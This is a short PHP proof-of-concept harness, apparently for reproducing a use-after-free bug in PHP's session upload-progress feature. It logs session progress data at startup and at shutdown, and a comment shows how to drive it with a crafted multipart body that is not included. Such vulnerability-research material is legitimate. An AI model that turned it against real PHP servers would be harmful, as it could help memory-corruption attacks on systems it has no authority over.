<?php
// PHP session.upload_progress UAF trigger (CVE-2026-109618/109619), PoC v0
// Drive: CONTENT_TYPE='multipart/form-data; boundary=POCBND' php -d session.save_path=$d poc.php < body.bin
session_start();
$p = $_SESSION['_upload_progress'] ?? null;
fwrite(STDERR, json_encode([
    'sapi' => php_sapi_name(),
    'post_keys' => array_keys($_POST),
    'files' => array_keys($_FILES),
    'progress_at_script_start' => $p,
]) . "\n");
register_shutdown_function(function () {
    fwrite(STDERR, 'shutdown_progress=' . json_encode($_SESSION['_upload_progress'] ?? null) . "\n");
});
